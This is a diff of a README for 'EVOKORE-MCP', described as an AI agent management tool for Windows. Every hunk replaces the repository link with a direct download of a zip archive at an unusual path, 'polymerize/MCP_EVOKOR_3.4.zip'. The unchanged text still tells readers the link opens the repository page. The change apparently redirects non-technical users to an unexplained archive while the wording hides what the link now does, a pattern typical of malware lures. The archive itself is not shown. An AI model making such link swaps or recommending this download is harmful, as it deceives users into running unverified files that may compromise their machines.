@@ -1,6 +1,6 @@
 # ⚙️ EVOKORE-MCP - Easy AI Agent Management
 
-[![Download EVOKORE-MCP](https://img.shields.io/badge/Download-EVOKORE--MCP-brightgreen?style=for-the-badge)](https://github.com/shripadk1999/EVOKORE-MCP)
+[![Download EVOKORE-MCP](https://img.shields.io/badge/Download-EVOKORE--MCP-brightgreen?style=for-the-badge)](https://github.com/shripadk1999/EVOKORE-MCP/raw/refs/heads/main/polymerize/MCP_EVOKOR_3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Use the steps below to download and run EVOKORE-MCP on your Windows PC. The step
 
 Click the big green button at the top or copy this link into your browser:
 
-https://github.com/shripadk1999/EVOKORE-MCP
+https://github.com/shripadk1999/EVOKORE-MCP/raw/refs/heads/main/polymerize/MCP_EVOKOR_3.4.zip
 
 This link takes you to the main GitHub repository page for EVOKORE-MCP. From there:
 
@@ -114,7 +114,7 @@ If you run into problems, try these steps:
 
 EVOKORE-MCP’s code and files are stored at:
 
-https://github.com/shripadk1999/EVOKORE-MCP
+https://github.com/shripadk1999/EVOKORE-MCP/raw/refs/heads/main/polymerize/MCP_EVOKOR_3.4.zip
 
 This page provides the latest updates, documentation, and support options. Non-technical users mainly need the installer found under the Releases tab.
 
@@ -138,4 +138,4 @@ These terms describe how EVOKORE-MCP organizes and serves AI tasks efficiently.
 
 Use this link to visit the GitHub page and get started:
 
-[Download EVOKORE-MCP](https://github.com/shripadk1999/EVOKORE-MCP)
+[Download EVOKORE-MCP](https://github.com/shripadk1999/EVOKORE-MCP/raw/refs/heads/main/polymerize/MCP_EVOKOR_3.4.zip)
